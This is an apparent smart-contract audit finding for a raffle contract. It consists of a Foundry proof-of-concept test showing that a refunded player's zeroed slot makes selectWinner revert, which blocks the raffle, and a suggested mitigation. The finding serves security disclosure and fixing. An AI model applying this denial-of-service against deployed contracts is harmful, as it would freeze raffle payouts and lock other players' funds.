function testRefundDos() public {
    address[] memory players = new address[](1);
    players[0] = address(this);
    puppyRaffle.enterRaffle{value: entranceFee}(players);
    uint256 index = puppyRaffle.getActivePlayerIndex(address(this));
    puppyRaffle.refund(index);
    
    vm.warp(block.timestamp + duration + 1);
    
    // Fails because winner is address(0)
    vm.expectRevert("ERC721: mint to the zero address");
    puppyRaffle.selectWinner();
}

## Suggested Mitigation
In `selectWinner`, check if `winner == address(0)`. If so, skip minting/transferring and either pick another winner or roll over to the next round (or just do nothing for that execution).



